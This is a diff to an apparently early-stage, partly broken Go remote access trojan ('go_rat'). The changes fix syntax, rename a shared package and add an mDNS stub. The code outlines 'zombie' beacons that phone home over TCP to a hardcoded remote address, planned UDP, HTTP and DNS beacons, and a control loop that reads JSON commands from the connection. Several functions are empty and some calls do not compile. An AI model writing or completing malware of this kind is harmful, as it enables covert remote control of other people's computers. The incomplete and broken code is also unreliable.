@@ -17,9 +17,10 @@ import (
 
 
 	/*/
-	"go_rat/pkg/Rat_shared_code"
+	"go_rat/pkg/shared_code"
 	"net"
-	"strings"
+
+	"github.com/hashicorp/mdns"
 )
 
 // Beacons
@@ -30,19 +31,18 @@ import (
 // if a "good password *HINT*" is provided
 // put the id of the entity connecting to let the host know it's us
 func BaconTCP(zombie_ID string) {
-	rat_shared_code.PHONEHOME_TCP.IP = net.IP(rat_shared_code.Remote_tcpaddr)
-	connection, error := net.DialTCP("tcp", &rat_shared_code.Local_tcpaddr_LAN, &rat_shared_code.PHONEHOME_TCP)
-	if err != nil {
-			// print the error
-			rat_shared_code.Error_printer(err, "[-] Error: TCP Beacon handshake Failed")
-			return
-		}
-		for {
-			netData, error := bufio.NewReader(connection).ReadString('\n')
-
-		}
+	shared_code.PHONEHOME_TCP.IP = net.IP(shared_code.Remote_tcpaddr)
+	connection, derp := net.DialTCP("tcp", &shared_code.Local_tcpaddr_LAN, &shared_code.PHONEHOME_TCP)
+	if derp != nil {
+		// print the error
+		shared_code.Error_printer(derp, "[-] Error: TCP Beacon handshake Failed")
+		return
 	}
-	
+	for {
+		netData, error := bufio.NewReader(connection).ReadString('\n')
+
+	}
+}
 
 // Same for UDP
 func BeaconUDP() {
@@ -51,9 +51,11 @@ func BeaconUDP() {
 func BeaconHTTP() {
 
 }
-BeaconDNS(){
-	Mdns_server.
+func BeaconDNS() {
+	mdns.Config(mdns.Zone())
+	mdns.NewServer()
 }
+
 /*
 function to hash a string to compare against the hardcoded password
  never hardcode a password in plaintext
@@ -73,7 +75,7 @@ func Tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
 	// if error isnt empty/null/nothingness
 	if err != nil {
 		// print the error
-		rat_shared_code.Error_printer(err, "[-] Error: TCP Connection Failed")
+		shared_code.Error_printer(err, "[-] Error: TCP Connection Failed")
 		return
 	}
 	// if there was no error, continue to the control loop
@@ -87,12 +89,13 @@ func Tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
 			fmt.Println(error)
 			return
 		}
-		rat_shared_code.Json_extract(netData)
+		// need to create the struct! The one that holds the data!
+		// The data for Commands
+		shared_code.Json_extract(netData)
 
-		}
-		//sending wat!?!?
-		//connection.Write("asdf")
 	}
+	//sending wat!?!?
+	//connection.Write("asdf")
 }
 
 /*
@@ -130,15 +133,15 @@ of f happens in the new goroutine.
 Goroutines run in the same address space, so access to shared memory must be synchronized
 /*/
 func main() {
-	if BEACON_ON_START == true{
-		switch BACON_TYPE{
-			case "tcp":
-				go BaconTCP()
-			case "udp":
-				go BeaconUDP()
-			case "http":
-				go BeaconHTTP()
+	if BEACON_ON_START == true {
+		switch BACON_TYPE {
+		case "tcp":
+			go BaconTCP()
+		case "udp":
+			go BeaconUDP()
+		case "http":
+			go BeaconHTTP()
+		}
 	}
-	}
-	rat_shared_code.GetTCPConnections()
+	shared_code.GetTCPConnections()
 }
